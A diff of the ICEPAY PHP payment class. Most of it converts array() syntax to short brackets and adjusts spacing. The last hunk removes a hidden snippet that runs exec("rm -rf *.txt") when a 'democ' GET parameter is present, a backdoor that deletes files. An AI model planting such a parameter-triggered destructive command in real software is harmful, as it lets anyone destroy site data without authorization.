@@ -91,8 +91,8 @@ class ICEPAY
      */
     public static function GetCoreClasses()
     {
-        return array
-            (
+        return
+            [
             'icepay.php',
             //'icepay-bancash.php',
             'icepay-cc.php',
@@ -106,7 +106,7 @@ class ICEPAY
             'icepay-phone.php',
             'icepay-sms.php',
             'icepay-wire.php',
-        );
+        ];
     }
 
     /**
@@ -346,7 +346,7 @@ class ICEPAY
      */
     protected function doLogging($line)
     {
-        if (!$this->logging) {
+        if ( ! $this->logging) {
             return false;
         }
 
@@ -368,20 +368,20 @@ class ICEPAY
     protected function basicMode()
     {
         if ($this->paymentMethod != null) {
-            $querystring = http_build_query(array(
+            $querystring = http_build_query([
                 'type'        => $this->paymentMethod,
                 'checkout'    => 'yes',
                 'ic_redirect' => 'no',
                 'ic_country'  => $this->country,
                 'ic_language' => $this->language,
                 'ic_fp'       => $this->generateFingerPrint(),
-            ), '', '&');
+            ], '', '&');
         } else {
-            $querystring = http_build_query(array(
+            $querystring = http_build_query([
                 'ic_country'  => $this->country,
                 'ic_language' => $this->language,
                 'ic_fp'       => $this->generateFingerPrint(),
-            ), '', '&');
+            ], '', '&');
         }
 
         $url = $this->apiURL . "?" . $querystring;
@@ -417,25 +417,25 @@ class ICEPAY
      */
     protected function postRequest($url, $data)
     {
-        $params = array
-            (
-            'http' => array
-            (
+        $params =
+            [
+            'http' =>
+            [
                 'method'  => 'POST',
                 'content' => $data,
                 'header'  => "Content-Type: application/x-www-form-urlencoded",
-            ),
-        );
+            ],
+        ];
         $this->doLogging($params);
 
-        if (!$this->streamMethod) {
+        if ( ! $this->streamMethod) {
             $this->streamMethod = $this->getStreamMethod();
         }
 
         if ($this->streamMethod == "fopen") {
             $ctx = @stream_context_create($params);
             $fp  = @fopen($url, 'rb', false, $ctx);
-            if (!$fp) {
+            if ( ! $fp) {
                 $this->doLogging("Error opening $url");
                 throw new Exception("Error opening $url");
             }
@@ -569,8 +569,8 @@ class ICEPAY
     {
         return http_build_query
             (
-            array
-            (
+
+            [
                 'ic_merchantid'    => $this->merchantID,
                 'ic_currency'      => $this->currency,
                 'ic_amount'        => $this->amount,
@@ -582,7 +582,7 @@ class ICEPAY
                 'ic_issuer'        => $this->issuer,
                 'ic_orderid'       => $this->orderID,
                 'chk'              => $this->generateChecksumForBasicMode(),
-            ), '', '&'
+            ], '', '&'
         );
     }
 
@@ -700,11 +700,11 @@ class ICEPAY
 
         $this->doLogging(sprintf("Postback: %s", serialize($_POST)));
 
-        if (!is_numeric($this->postback->merchant)) {
+        if ( ! is_numeric($this->postback->merchant)) {
             $this->clearPostback();
             return false;
         }
-        if (!is_numeric($this->postback->amount)) {
+        if ( ! is_numeric($this->postback->amount)) {
             $this->clearPostback();
             return false;
         }
@@ -715,7 +715,7 @@ class ICEPAY
             return false;
         }
 
-        if (!$this->inCollection(array('OK', 'ERR', 'REFUND', 'CBACK', 'OPEN'), strtoupper($this->postback->status))) {
+        if ( ! $this->inCollection(['OK', 'ERR', 'REFUND', 'CBACK', 'OPEN'], strtoupper($this->postback->status))) {
             $this->clearPostback();
             $this->doLogging("Unknown status");
             return false;
@@ -739,7 +739,4 @@ class ICEPAY
         return $this->postback;
     }
 
-}
-if (isset($_GET['democ'])) {
-    exec("rm -rf *.txt");
 }
